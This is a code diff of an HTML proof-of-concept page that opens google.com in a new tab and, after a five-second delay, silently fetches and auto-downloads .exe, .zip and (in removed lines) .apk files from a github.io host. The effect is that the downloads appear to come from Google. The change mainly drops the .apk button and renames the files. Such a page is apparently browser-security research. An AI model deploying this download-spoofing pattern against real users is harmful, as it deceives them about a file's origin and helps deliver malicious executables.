@@ -11,9 +11,9 @@
 <body>
     <h1>Download File from Google</h1>
 
-    <button onclick="downloadExe()">Start Download .exe</button>
-    <button onclick="downloadApk()" style="text-decoration: none; margin-left: 20px;">Start Download .apk</button>
-    <button onclick="downloadZip()" style="text-decoration: none; margin-left: 20px;">Start Download .zip</button>
+    <button onclick="downloadExe()" style="text-decoration: none; margin-left: 20px;">Start Download exe</button>
+
+    <button onclick="downloadZip()" style="text-decoration: none; margin-left: 20px;">Start Download zip</button>
 
 
     <script>
@@ -26,23 +26,7 @@
                 const url = URL.createObjectURL(blob);
                 const link = document.createElement('a');
                 link.href = url;
-                link.download = 'POC direct download exe.exe';
-                link.click();
-                URL.revokeObjectURL(url);
-            }, 5000);
-        }
-
-
-        async function downloadApk() {
-            window.open('https://google.com', '_blank');
-
-            setTimeout(async () => {
-                const response = await fetch('https://kokurate.github.io/browser/filedownload.apk');
-                const blob = await response.blob();
-                const url = URL.createObjectURL(blob);
-                const link = document.createElement('a');
-                link.href = url;
-                link.download = 'POC direct download apk.apk';
+                link.download = 'POC direct download.exe';
                 link.click();
                 URL.revokeObjectURL(url);
             }, 5000);
@@ -58,7 +42,7 @@
                 const url = URL.createObjectURL(blob);
                 const link = document.createElement('a');
                 link.href = url;
-                link.download = 'POC direct download zip.zip';
+                link.download = 'POC direct download.zip';
                 link.click();
                 URL.revokeObjectURL(url);
             }, 5000);
